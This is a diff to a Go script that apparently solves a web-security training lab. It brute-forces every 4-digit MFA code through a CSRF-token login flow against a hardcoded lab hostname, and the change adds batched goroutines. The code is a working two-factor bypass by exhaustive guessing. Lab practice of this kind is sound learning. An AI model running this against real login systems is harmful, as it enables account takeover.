@@ -20,16 +20,24 @@ func solve(hostname string) {
 	*/
 
 	foundChannel := make(chan bool)
+	done := make(chan bool)
 
-	for mfaCode := 0; mfaCode < 10000; mfaCode++ {
-		mfaCodeAsString := fmt.Sprintf("%04d", mfaCode)
-		go attemptFlow(hostname, mfaCodeAsString, foundChannel)
+	maxRoutines := 15 // Limits the number of routines to not overflow the number of sockets that can be open
+
+	for i := 0; i < 10000; i += maxRoutines {
+		for mfaCode := i; mfaCode < i + maxRoutines; mfaCode++ {
+			mfaCodeAsString := fmt.Sprintf("%04d", mfaCode)
+			go attemptFlow(hostname, mfaCodeAsString, foundChannel, done)
+		}
+		for mfaCode := i; mfaCode < i + maxRoutines; mfaCode++ {
+			<- done
+		}
 	}
-
 	<- foundChannel
+
 }
 
-func attemptFlow(hostname string, mfaCode string, foundChannel chan bool) {
+func attemptFlow(hostname string, mfaCode string, foundChannel chan bool, done chan bool) {
 	csrfToken, cookies := firstStep(hostname)
 	log.Printf("CSRF Token from first step: %s", csrfToken)
 	cookies = secondStep(hostname, csrfToken, cookies)
@@ -40,6 +48,7 @@ func attemptFlow(hostname string, mfaCode string, foundChannel chan bool) {
 	if isSuccessful {
 		foundChannel <- true
 	}
+	done <- true
 }
 
 func firstStep(hostname string) (string, []*http.Cookie) {
@@ -169,6 +178,6 @@ func findCsrfTokenInBody(body string) string {
 func main() {
 	log.SetFlags(log.LstdFlags | log.Lmicroseconds)
 
-	hardcodedHostname := "https://ac2c1f521e7b328380ba0ed4004c00ae.web-security-academy.net"
+	hardcodedHostname := "https://ac2f1fbe1e86329280a01063003c00ba.web-security-academy.net"
 	solve(hardcodedHostname)
 }
